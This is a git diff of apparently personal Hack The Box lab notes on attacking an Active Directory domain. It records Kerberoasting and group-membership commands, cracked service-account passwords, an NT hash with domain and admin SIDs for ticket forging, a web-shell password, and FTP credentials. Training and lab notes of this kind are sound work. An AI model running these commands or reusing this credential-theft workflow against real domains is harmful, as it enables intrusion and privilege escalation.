@@ -18,6 +18,8 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend  Klmcargo2
 SAPService !SapperFi2
 wley transporter@4 
 adunn SyncMaster757
+MSSQLsvc/sql01.freightlogstics:1433 mssqlsvc 1logistics
+HTTP/sapsso.FREIGHTLOGISTICS.LOCAL  sapsso pabloPICASSO
 ```
 
 ```
@@ -27,3 +29,37 @@ net rpc group addmem "HELP DESK LEVEL 1" "damundsen" -U "INLANEFREIGHT.LOCAL"/"d
 Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select
 
 
+
+```
+hash 9d765b482771505cbe97411065964d5f
+Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+Domain SID S-1-5-21-3842939050-3880317879-2865463114 logistics.inlanefreight.local
+```
+
+
+---
+
+```
+admin My_W3bsH3ll_P@ssw0rd! `/uploads`
+```
+
+
+```
+172.16.6.3     DC01.INLANEFREIGHT.LOCAL
+10.129.99.155  PIVOTAPI.LicorDeBellota.htb  --> ftp
+
+```
+
+## 10.129.99.155 ftp
+```
+fatty server : 1337, 1338, 1339
+they use java 8.
+qtc  clarabibi
+```
+
+
+# Things done
+- enbled developer mode.
+- pressing to much on the tap
+- language
+- enable dugging mode.
